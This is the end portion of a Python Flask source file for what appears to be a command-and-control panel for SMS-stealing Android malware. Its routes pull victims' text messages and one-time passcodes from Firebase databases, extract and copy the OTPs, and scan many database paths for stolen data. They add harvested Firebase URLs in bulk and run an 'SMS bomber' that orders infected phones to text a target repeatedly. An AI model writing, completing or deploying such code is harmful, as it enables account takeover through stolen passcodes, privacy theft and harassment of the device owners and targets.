function copyOtp(code){
  if(navigator.clipboard){ navigator.clipboard.writeText(code).then(()=>toast('✅ COPIED: ' + code)).catch(()=>{}); }
}

function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }

loadFirebase();
setInterval(loadFirebase, 30000);
</script>
</body>
</html>
"""


# ==================== DEBUG HTML ====================
DEBUG_HTML = r"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Raw Data Explorer</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<style>*{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace}
body{background:#0a0e1a;color:#e0e6ff;min-height:100vh;padding:14px;background-image:radial-gradient(ellipse at top,#1a0a0e 0%,#0a0e1a 60%)}
.wrap{max-width:900px;margin:0 auto}
h1{font-size:14px;font-weight:900;color:#ff3860;margin-bottom:6px;letter-spacing:1.5px;text-transform:uppercase;text-shadow:0 0 10px rgba(255,56,96,.5)}
.sub{font-size:11px;color:#4a5270;margin-bottom:14px;word-break:break-all;letter-spacing:1px}
.card{background:#111827;border:1px solid #1f2937;border-radius:10px;padding:12px;margin-bottom:10px;font-size:11px}
.path{color:#ffd700;font-weight:900;margin-bottom:6px;font-family:'Courier New',monospace;word-break:break-all;letter-spacing:1px}
.status-ok{color:#00ff41;font-weight:900;margin-bottom:6px;letter-spacing:1px}
.status-empty{color:#ff3860;font-weight:900;margin-bottom:6px;letter-spacing:1px}
.data{background:#0a0e1a;border:1px solid #1f2937;border-radius:6px;padding:10px;color:#c5d0e6;font-family:'Courier New',monospace;font-size:10px;white-space:pre-wrap;word-break:break-word;max-height:400px;overflow-y:auto}
.summary{background:rgba(255,56,96,.08);border:1px solid rgba(255,56,96,.3);border-radius:10px;padding:14px;margin-bottom:14px;font-size:12px;letter-spacing:1px}
.summary b{color:#ff3860}
.back{display:inline-block;padding:10px 14px;background:#1f2937;color:#e0e6ff;text-decoration:none;border-radius:6px;font-size:11px;margin-bottom:12px;letter-spacing:1px;text-transform:uppercase;border:1px solid #374151}
.back:hover{background:#374151}
.spinner{display:inline-block;width:14px;height:14px;border:2px solid #1f2937;border-top-color:#ff3860;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:6px}
@keyframes spin{to{transform:rotate(360deg)}}</style></head><body>
<div class="wrap">
<a href="/supermasteradmin/firebases" class="back">← BACK</a>
<h1>🔍 RAW DATA EXPLORER</h1>
<div class="sub" id="sub">LOADING...</div>
<div class="summary" id="summary" style="display:none">SCANNING...</div>
<div id="results"></div>
</div>
<script>
const params = new URLSearchParams(window.location.search);
const FB = params.get('fb');
const DEV = params.get('id');
document.getElementById('sub').textContent = 'DEVICE: ' + DEV;
async function scan(){
  const results = document.getElementById('results');
  results.innerHTML = '<div class="card"><span class="spinner"></span>SCANNING...</div>';
  try{
    const r = await fetch('/api/rawdata?fb=' + encodeURIComponent(FB) + '&id=' + encodeURIComponent(DEV));
    const d = await r.json();
    if(!d.success){ results.innerHTML = '<div class="card status-empty">❌ '+(d.error||'ERROR')+'</div>'; return; }
    document.getElementById('summary').style.display = 'block';
    document.getElementById('summary').innerHTML = `🔎 <b>${d.scanned} PATHS</b> SCANNED — <b>${d.found}</b> WITH DATA`;
    results.innerHTML = d.results.map(item => {
      const cls = item.status === 'has_data' ? 'status-ok' : 'status-empty';
      const statusTxt = item.status === 'has_data' ? '✅ HAS DATA' + (item.message_count ? ` — ${item.message_count} MSGS` : '') : '⚪ EMPTY';
      const dataTxt = item.data ? JSON.stringify(item.data, null, 2).slice(0, 3000) : '';
      return `<div class="card"><div class="path">${item.path}</div><div class="${cls}">${statusTxt}</div>${dataTxt ? `<div class="data">${escapeHtml(dataTxt)}</div>` : ''}</div>`;
    }).join('');
  }catch(e){ results.innerHTML = '<div class="card status-empty">❌ NETWORK ERROR</div>'; }
}
function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }
scan();
</script>
</body></html>
"""


# ==================== ROUTES ====================
@app.route("/login", methods=["GET", "POST"])
def login_page():
    # User login bypassed - direct to dashboard
    session["logged_in"] = True
    session["role"] = "user"
    return redirect(url_for("user_dashboard"))


@app.route("/supermasteradmin", methods=["GET", "POST"])
def admin_login_page():
    if session.get("logged_in") and session.get("role") == "admin":
        return redirect(url_for("admin_dashboard"))
    error = ""
    if request.method == "POST":
        pwd = request.form.get("password", "")
        if pwd == get_pwd("admin"):
            session["logged_in"] = True
            session["role"] = "admin"
            return redirect(url_for("admin_dashboard"))
        error = '<div class="err">❌ ACCESS DENIED — ROOT KEY REQUIRED</div>'
    return Response(ADMIN_LOGIN_HTML.replace("__ERROR__", error), mimetype="text/html")


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login_page"))


@app.route("/")
@login_required
def user_dashboard():
    return Response(USER_DASHBOARD_HTML, mimetype="text/html")


@app.route("/supermasteradmin/dashboard")
@admin_required
def admin_dashboard():
    return Response(ADMIN_DASHBOARD_HTML, mimetype="text/html")


@app.route("/supermasteradmin/security")
@admin_required
def admin_security():
    return Response(SECURITY_HTML, mimetype="text/html")


@app.route("/supermasteradmin/smslogs")
@admin_required
def admin_smslogs():
    return Response(SMS_LOGS_HTML, mimetype="text/html")


@app.route("/supermasteradmin/firebases")
@admin_required
def firebases_page():
    return Response(FIREBASES_HTML, mimetype="text/html")


@app.route("/supermasteradmin/firebase/<fb_id>")
@admin_required
def firebase_view_page(fb_id):
    return Response(FIREBASE_VIEW_HTML.replace("{{FB_ID}}", fb_id), mimetype="text/html")


@app.route("/supermasteradmin/debug")
@admin_required
def debug_page():
    return Response(DEBUG_HTML, mimetype="text/html")


# ==================== PANEL STATE APIS ====================
@app.route("/api/panel/status")
@admin_required
def api_panel_status():
    state = get_user_panel_state()
    return jsonify({"success": True, **state})


@app.route("/api/panel/status_public")
def api_panel_status_public():
    state = get_user_panel_state()
    return jsonify({
        "success": True,
        "active": state["active"],
        "expires_at": state["expires_at"],
        "passwordless": state["passwordless"],
        "bomber_active": state["bomber_active"],
        "now": state["now"],
    })


@app.route("/api/panel/activate", methods=["POST"])
@admin_required
def api_panel_activate():
    data = request.get_json() or {}
    try:
        minutes = int(data.get("minutes", 0))
    except Exception:
        minutes = 0
    if minutes > 0:
        expires_at = int(time.time()) + minutes * 60
        set_setting("user_panel_expires_at", expires_at)
    else:
        set_setting("user_panel_expires_at", 0)
    set_setting("user_panel_active", "true")
    return jsonify({"success": True})


@app.route("/api/panel/deactivate", methods=["POST"])
@admin_required
def api_panel_deactivate():
    set_setting("user_panel_active", "false")
    set_setting("user_panel_expires_at", 0)
    return jsonify({"success": True})


@app.route("/api/panel/passwordless", methods=["POST"])
@admin_required
def api_panel_passwordless():
    data = request.get_json() or {}
    enabled = bool(data.get("enabled", False))
    try:
        minutes = int(data.get("minutes", 0))
    except Exception:
        minutes = 0
    set_setting("passwordless_mode", "true" if enabled else "false")
    if enabled and minutes > 0:
        set_setting("passwordless_expires_at", int(time.time()) + minutes * 60)
    else:
        set_setting("passwordless_expires_at", 0)
    return jsonify({"success": True})


@app.route("/api/panel/bomber", methods=["POST"])
@admin_required
def api_panel_bomber():
    data = request.get_json() or {}
    enabled = bool(data.get("enabled", False))
    set_setting("sms_bomber_active", "true" if enabled else "false")
    return jsonify({"success": True})


# ==================== API ROUTES ====================
@app.route("/api/conn")
def api_conn():
    return jsonify({"success": True, "mongo_connected": MONGO_OK})


@app.route("/api/refresh", methods=["POST"])
@login_required
def api_refresh():
    threading.Thread(target=refresh_cache, daemon=True).start()
    return jsonify({"success": True})


@app.route("/api/numbers")
@login_required
def api_numbers():
    with cache["lock"]:
        nums = list(cache["numbers_map"].values())
        stats = dict(cache["stats"])
        loading = cache["loading"]
        progress = dict(cache["progress"])
    if not nums and not loading:
        threading.Thread(target=refresh_cache, daemon=True).start()
    fb_total = 0
    if MONGO_OK:
        try:
            fb_total = fb_collection.count_documents({})
        except Exception:
            fb_total = 0
    return jsonify({
        "success": True, "numbers": nums,
        "total": stats.get("total", 0), "online": stats.get("online", 0),
        "offline": stats.get("offline", 0), "otp_rate": stats.get("otp_rate", 0),
        "loading": loading, "progress": progress, "firebases_total": fb_total,
    })


@app.route("/api/inbox")
def api_inbox():
    try:
        fb_url = request.args.get("fb", "").strip()
        dev_id = request.args.get("id", "").strip()
        num = request.args.get("num", "").strip()

        if not fb_url or not dev_id or not num:
            return jsonify({"success": False, "error": "fb, id, num required"}), 400

        key = f"{fb_url}|{dev_id}|{num}"
        now = time.time()

        with cache["lock"]:
            cached = cache["device_messages"].get(key)
            cached_at = cache["msg_cache_time"].get(key, 0)
            inbox_lock = cache["inbox_locks"].setdefault(key, threading.Lock())

        if cached and (now - cached_at) < MESSAGE_CACHE_TTL:
            return jsonify({"success": True, "messages": cached[:MAX_SMS_PER_NUMBER], "count": len(cached), "cached": True, "target_number": num})

        with inbox_lock:
            with cache["lock"]:
                cached = cache["device_messages"].get(key)
                cached_at = cache["msg_cache_time"].get(key, 0)
            if cached and (time.time() - cached_at) < MESSAGE_CACHE_TTL:
                return jsonify({"success": True, "messages": cached[:MAX_SMS_PER_NUMBER], "count": len(cached), "cached": True, "target_number": num})

            msgs = fetch_messages_multi_path(fb_url, dev_id, phone_numbers=[num])
            received = [m for m in msgs if m.get("type") == "received"]
            matched = received if received else msgs
            matched = sorted(matched, key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
            for m in matched:
                m["otp"] = extract_otp(m.get("message", ""))
            matched = matched[:MAX_SMS_PER_NUMBER]

            with cache["lock"]:
                cache["device_messages"][key] = matched
                cache["msg_cache_time"][key] = time.time()

        return jsonify({"success": True, "messages": matched, "count": len(matched), "cached": False, "target_number": num})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@app.route("/api/sms/send", methods=["POST"])
@login_required
def api_sms_send():
    try:
        data = request.get_json() or {}
        fb_url = data.get("fb_url", "").strip()
        device_id = data.get("device_id", "").strip()
        target = data.get("target", "").strip()
        message = data.get("message", "").strip()
        count = int(data.get("count", 1))

        if not fb_url or not device_id or not target or not message:
            return jsonify({"success": False, "error": "All fields required"}), 400

        if count > 50:
            count = 50

        panel_state = get_user_panel_state()
        if count > 1 and not panel_state["bomber_active"]:
            return jsonify({"success": False, "error": "SMS Bomber is currently disabled by Admin"}), 403

        base = fb_url.rstrip("/")
        paths = [
            f"/commands/{device_id}.json",
            f"/sendSMS/{device_id}.json",
            f"/sms/{device_id}.json",
            f"/tasks/{device_id}.json"
        ]
        
        payload = {
            "command": "send_sms",
            "action": "send_sms",
            "to": target,
            "message": message,
            "timestamp": int(time.time() * 1000)
        }

        sent = 0
        for _ in range(count):
            for p in paths:
                try:
                    requests.post(base + p, json=payload, timeout=5)
                except:
                    pass
            sent += 1
            if count > 1:
                time.sleep(0.5)

        if MONGO_OK:
            sms_logs_collection.insert_one({
                "fb_url": fb_url,
                "device_id": device_id,
                "target": target,
                "message": message,
                "count": sent,
                "timestamp": int(time.time()),
                "ip": request.remote_addr
            })

        return jsonify({"success": True, "count": sent})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@app.route("/api/sms/logs")
@admin_required
def api_sms_logs():
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    try:
        logs = list(sms_logs_collection.find({}).sort("timestamp", -1).limit(100))
        out = []
        for l in logs:
            out.append({
                "target": l.get("target"),
                "message": l.get("message"),
                "count": l.get("count"),
                "device_id": l.get("device_id"),
                "timestamp": l.get("timestamp")
            })
        return jsonify({"success": True, "logs": out})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@app.route("/api/otp/add", methods=["POST"])
def api_otp_add():
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    try:
        data = request.get_json() or {}
        url = (data.get("url") or "").strip().rstrip("/")
        if url and not url.startswith("http"):
            url = "https://" + url
        if not url or "firebase" not in url:
            return jsonify({"success": False, "error": "Invalid firebase URL"}), 400
        if fb_collection.find_one({"url": url}):
            return jsonify({"success": True, "message": "Already in database", "hash": fb_hash(url)})
        name = url.replace("https://", "").split(".")[0][:30]
        fb_collection.insert_one({
            "url": url, "name": name,
            "added_at": int(time.time()),
            "source": "personal_otp",
        })
        threading.Thread(target=refresh_cache, daemon=True).start()
        return jsonify({"success": True, "hash": fb_hash(url)})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@app.route("/api/rawdata")
@admin_required
def api_rawdata():
    fb_url = request.args.get("fb", "").strip()
    dev_id = request.args.get("id", "").strip()
    if not fb_url or not dev_id:
        return jsonify({"success": False, "error": "fb and id required"}), 400
    base = fb_url.rstrip("/")
    paths = [
        f'/messages/{dev_id}.json?orderBy="$key"&limitToLast=60',
        f"/messages/{dev_id}.json", f"/clients/{dev_id}.json",
        f"/clients/{dev_id}/messages.json", f"/clients/{dev_id}/sms.json",
        f"/clients/{dev_id}/inbox.json", f"/clients/{dev_id}/receivedSms.json",
        f"/clients/{dev_id}/received.json", f"/clients/{dev_id}/incoming.json",
        f"/clients/{dev_id}/sms_history.json", f"/clients/{dev_id}/history.json",
        f"/clients/{dev_id}/logs.json", f"/inbox/{dev_id}.json",
        f"/received/{dev_id}.json", f"/sms/{dev_id}.json", "/clients.json?shallow=true",
    ]
    results = []
    found = 0
    for p in paths:
        url = base + p
        data = try_json(url, timeout=8)
        item = {"path": p, "data": None, "message_count": 0, "status": "not_found"}
        if data is None:
            item["status"] = "empty"
        else:
            item["data"] = data
            msgs = collect_all_messages(data)
            item["message_count"] = len(msgs)
            item["status"] = "has_data"
            found += 1
        results.append(item)
    return jsonify({"success": True, "scanned": len(paths), "found": found, "results": results})


@app.route("/api/security/change", methods=["POST"])
@admin_required
def api_security_change():
    data = request.get_json() or {}
    role = data.get("role", "").strip()
    pwd = data.get("password", "").strip()
    if role not in ("user", "admin"):
        return jsonify({"success": False, "error": "Invalid role"}), 400
    if not pwd or len(pwd) < 4:
        return jsonify({"success": False, "error": "Password too short (min 4 chars)"}), 400
    ok = set_pwd(role, pwd)
    if ok:
        return jsonify({"success": True, "message": f"{role} password saved to MongoDB"})
    return jsonify({"success": False, "error": "Failed to save password (MongoDB down)"}), 500


@app.route("/api/firebases", methods=["GET"])
@admin_required
def api_fb_list():
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    try:
        docs = list(fb_collection.find({}).sort("added_at", -1))
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500
    with cache["lock"]:
        fb_stats = dict(cache["fb_stats"]) if cache["fb_stats"] else {}
    if not fb_stats:
        threading.Thread(target=fetch_fb_stats, daemon=True).start()
    out = []
    for d in docs:
        url = d.get("url", "")
        fb_id = str(d["_id"])
        stats = fb_stats.get(fb_id, {"online": 0, "offline": 0, "devices": 0})
        out.append({
            "id": fb_id,
            "name": d.get("name", ""),
            "hash": fb_hash(url),
            "added_at": d.get("added_at", 0),
            "source": d.get("source", "admin"),
            "stats": stats,
        })
    return jsonify({"success": True, "firebases": out, "count": len(out)})


@app.route("/api/firebase/<fb_id>", methods=["GET"])
@admin_required
def api_fb_view(fb_id):
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    try:
        doc = fb_collection.find_one({"_id": ObjectId(fb_id)})
    except Exception:
        return jsonify({"success": False, "error": "Invalid id"}), 400
    if not doc:
        return jsonify({"success": False, "error": "Not found"}), 404
    fb_url = doc.get("url", "")
    devices = fetch_devices_from_one_fb(fb_url, doc.get("name", ""), fb_id)
    numbers = []
    otp_total = 0
    online_count = 0
    offline_count = 0
    for dev in devices:
        is_dev_online = dev.get("online", False)
        if is_dev_online: online_count += 1
        else: offline_count += 1
        for sim in dev.get("sims", []):
            num = sim["number"]
            msgs = dev.get("per_number", {}).get(num, [])
            otp_count = sum(1 for m in msgs if extract_otp(m.get("message", "")))
            otp_total += otp_count
            numbers.append({"number": num, "device_id": dev["id"], "device_name": dev.get("name", ""), "firebase": fb_url, "online": is_dev_online, "msg_count": len(msgs), "otp_count": otp_count})
    return jsonify({
        "success": True, "id": fb_id,
        "name": doc.get("name", ""),
        "hash": fb_hash(fb_url),
        "device_count": len(devices),
        "online_count": online_count,
        "offline_count": offline_count,
        "number_count": len(numbers),
        "otp_count": otp_total,
        "numbers": numbers,
    })


@app.route("/api/firebases", methods=["POST"])
@admin_required
def api_fb_add():
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    data = request.get_json() or {}
    url = (data.get("url") or "").strip().rstrip("/")
    if url and not url.startswith("http"):
        url = "https://" + url
    if not url or "firebase" not in url:
        return jsonify({"success": False, "error": "Invalid firebase URL"}), 400
    if fb_collection.find_one({"url": url}):
        return jsonify({"success": False, "error": "Already added"}), 409
    name = url.replace("https://", "").split(".")[0][:30]
    fb_collection.insert_one({"url": url, "name": name, "added_at": int(time.time()), "source": "admin"})
    threading.Thread(target=refresh_cache, daemon=True).start()
    return jsonify({"success": True})


@app.route("/api/firebases/bulk", methods=["POST"])
@admin_required
def api_fb_bulk():
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    data = request.get_json() or {}
    urls = data.get("urls", [])
    added, skipped = 0, 0
    for u in urls:
        url = (u or "").strip().rstrip("/")
        if url and not url.startswith("http"):
            url = "https://" + url
        if not url or "firebase" not in url:
            continue
        if fb_collection.find_one({"url": url}):
            skipped += 1
            continue
        name = url.replace("https://", "").split(".")[0][:30]
        fb_collection.insert_one({"url": url, "name": name, "added_at": int(time.time()), "source": "admin_bulk"})
        added += 1
    threading.Thread(target=refresh_cache, daemon=True).start()
    return jsonify({"success": True, "added": added, "skipped": skipped})


@app.route("/api/firebases/<fb_id>", methods=["DELETE"])
@admin_required
def api_fb_delete(fb_id):
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    try:
        doc = fb_collection.find_one({"_id": ObjectId(fb_id)})
        fb_url = doc.get("url", "") if doc else ""
        res = fb_collection.delete_one({"_id": ObjectId(fb_id)})
        if res.deleted_count == 0:
            return jsonify({"success": False, "error": "Not found"}), 404
        with cache["lock"]:
            cache["numbers_map"] = {}
            cache["devices"] = {}
            cache["device_messages"] = {}
            cache["msg_cache_time"] = {}
            cache["stats"] = {"total": 0, "online": 0, "offline": 0, "otp_rate": 0}
            cache["fb_stats"] = {}
        threading.Thread(target=refresh_cache, daemon=True).start()
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 400


@app.route("/api/firebases/bulk-delete", methods=["POST"])
@admin_required
def api_fb_bulk_delete():
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    data = request.get_json() or {}
    ids = data.get("ids", [])
    deleted = 0
    for i in ids:
        try:
            res = fb_collection.delete_one({"_id": ObjectId(i)})
            deleted += res.deleted_count
        except Exception:
            pass
    with cache["lock"]:
        cache["numbers_map"] = {}
        cache["devices"] = {}
        cache["device_messages"] = {}
        cache["msg_cache_time"] = {}
        cache["stats"] = {"total": 0, "online": 0, "offline": 0, "otp_rate": 0}
        cache["fb_stats"] = {}
    threading.Thread(target=refresh_cache, daemon=True).start()
    return jsonify({"success": True, "deleted": deleted})


@app.route("/api/firebases/all", methods=["DELETE"])
@admin_required
def api_fb_delete_all():
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    try:
        res = fb_collection.delete_many({})
        with cache["lock"]:
            cache["numbers_map"] = {}
            cache["devices"] = {}
            cache["device_messages"] = {}
            cache["msg_cache_time"] = {}
            cache["stats"] = {"total": 0, "online": 0, "offline": 0, "otp_rate": 0}
            cache["fb_stats"] = {}
        threading.Thread(target=refresh_cache, daemon=True).start()
        return jsonify({"success": True, "deleted": res.deleted_count})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
